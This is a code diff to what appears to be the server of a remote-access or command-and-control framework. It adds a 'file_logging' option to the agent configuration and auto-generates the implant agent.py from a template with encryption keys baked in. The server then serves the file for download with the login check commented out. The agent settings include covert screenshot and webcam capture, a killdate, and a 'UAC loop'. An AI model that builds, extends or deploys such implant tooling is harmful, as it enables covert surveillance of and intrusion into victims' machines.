@@ -1589,6 +1589,7 @@ result = "UAC loop started"
                 'killdate_enabled': killdate_enabled,
                 'killdate': killdate_value if killdate_enabled else "",
                 'trusted_certificate': bool(data.get('trusted_certificate', False)),
+                'file_logging': bool(data.get('file_logging', False)),
                 'aes_key': CONFIG.aes_key.decode('latin-1'),  # Convert bytes to string for storage
                 'aes_iv': CONFIG.aes_iv.decode('latin-1')     # Convert bytes to string for storage
             }
@@ -1596,9 +1597,13 @@ result = "UAC loop started"
             # Save agent configuration to database
             conn = sqlite3.connect(CONFIG.database)
             c = conn.cursor()
+            try:
+                c.execute("ALTER TABLE agent_configurations ADD COLUMN file_logging INTEGER NOT NULL DEFAULT 0")
+            except sqlite3.OperationalError:
+                pass
             c.execute('''INSERT INTO agent_configurations
-                         (checkin_interval, server_url, take_screenshots, screenshot_frequency, take_webcam, webcam_frequency, killdate_enabled, killdate, trusted_certificate, aes_key, aes_iv, timestamp)
-                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                         (checkin_interval, server_url, take_screenshots, screenshot_frequency, take_webcam, webcam_frequency, killdate_enabled, killdate, trusted_certificate, file_logging, aes_key, aes_iv, timestamp)
+                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                       (config['checkin_interval'],
                        config['server_url'],
                        int(config['take_screenshots']),
@@ -1608,6 +1613,7 @@ result = "UAC loop started"
                        int(config['killdate_enabled']),
                        config['killdate'],
                        int(config['trusted_certificate']),
+                       int(config['file_logging']),
                        config['aes_key'],
                        config['aes_iv'],
                        datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')))
@@ -1636,6 +1642,7 @@ result = "UAC loop started"
                 webcam_frequency=config['webcam_frequency'],
                 killdate_enabled=str(config['killdate_enabled']),
                 killdate=config['killdate'] if config['killdate_enabled'] else "",
+                file_logging=str(config['file_logging']),
                 aes_key=repr(CONFIG.aes_key),  # Keep as bytes object
                 aes_iv=repr(CONFIG.aes_iv),     # Keep as bytes object
                 random=random
@@ -1674,7 +1681,60 @@ result = "UAC loop started"
     #@login_required
     def download_agent():
         agents_dir = os.path.join(app.root_path, 'agents')
-        if not os.path.exists(os.path.join(agents_dir, 'agent.py')):
+        os.makedirs(agents_dir, exist_ok=True)
+        agent_path = os.path.join(agents_dir, 'agent.py')
+        template_path = os.path.join(app.root_path, 'templates', 'agent_template.py')
+
+        # Auto-rebuild agent.py from agent_template.py if missing or if template is newer
+        try:
+            need_rebuild = not os.path.exists(agent_path) or (
+                os.path.exists(template_path) and os.path.getmtime(template_path) > os.path.getmtime(agent_path)
+            )
+            if need_rebuild and os.path.exists(template_path):
+                conn = sqlite3.connect(CONFIG.database)
+                c = conn.cursor()
+                try:
+                    c.execute("ALTER TABLE agent_configurations ADD COLUMN file_logging INTEGER NOT NULL DEFAULT 0")
+                except sqlite3.OperationalError:
+                    pass
+                c.execute(
+                    """SELECT checkin_interval, server_url, take_screenshots, screenshot_frequency,
+                              take_webcam, webcam_frequency, killdate_enabled, killdate, file_logging
+                       FROM agent_configurations ORDER BY id DESC LIMIT 1"""
+                )
+                row = c.fetchone()
+                conn.close()
+                if row:
+                    checkin_interval, server_url, take_ss, ss_freq, take_wc, wc_freq, kd_en, kd_val, file_log = row
+                else:
+                    checkin_interval = 10
+                    server_url = request.url_root.rstrip('/')
+                    take_ss, ss_freq = 1, 10
+                    take_wc, wc_freq = 0, 10
+                    kd_en, kd_val = 0, ""
+                    file_log = 0
+                with open(template_path, 'r') as f:
+                    template = f.read()
+                agent_code = template.format(
+                    checkin_interval=checkin_interval,
+                    server_url=server_url,
+                    take_screenshots=str(bool(take_ss)),
+                    screenshot_frequency=ss_freq,
+                    take_webcam=str(bool(take_wc)),
+                    webcam_frequency=wc_freq,
+                    killdate_enabled=str(bool(kd_en)),
+                    killdate=(kd_val or "") if kd_en else "",
+                    file_logging=str(bool(file_log)),
+                    aes_key=repr(CONFIG.aes_key),
+                    aes_iv=repr(CONFIG.aes_iv),
+                    random=random,
+                )
+                with open(agent_path, 'w') as f:
+                    f.write(agent_code)
+        except Exception as err:
+            app.logger.error(f"Auto-rebuild of agent.py failed: {err}")
+
+        if not os.path.exists(agent_path):
             return jsonify({"status": "error", "message": "Agent file not found"}), 404
         return send_from_directory(agents_dir, 'agent.py', as_attachment=True)
     
